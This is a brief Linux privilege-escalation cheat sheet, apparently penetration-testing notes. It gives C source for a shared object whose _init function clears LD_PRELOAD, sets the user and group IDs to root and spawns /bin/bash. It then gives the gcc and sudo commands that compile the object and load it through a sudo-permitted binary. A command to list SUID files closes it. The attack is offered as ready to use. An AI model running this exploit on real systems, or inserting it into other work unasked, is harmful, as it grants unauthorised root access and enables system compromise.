# Sudo Based Privilege Escalation  
The holy bible of Linux Privesc: [https://gtfobins.github.io/](https://gtfobins.github.io/)

## Abusing sudo with LD_PRELOAD 
You can abuse the LD_Preload sudo permission by writing and compiling the following C code. This will:
1.  Check for LD_PRELOAD (with the env_keep option)
2.  Write a simple C code compiled as a share object (.so extension) file
3.  Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
```c
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
unsetenv("LD_PRELOAD");  
setgid(0);  
setuid(0);  
system("/bin/bash");  
}
```

Save and compile using:
```bash 
# Compile
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
# Run
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

# SUID based 
Find files with SUID bit set:
```bash
find / -type f -perm -04000 -ls 2>/dev/null
```
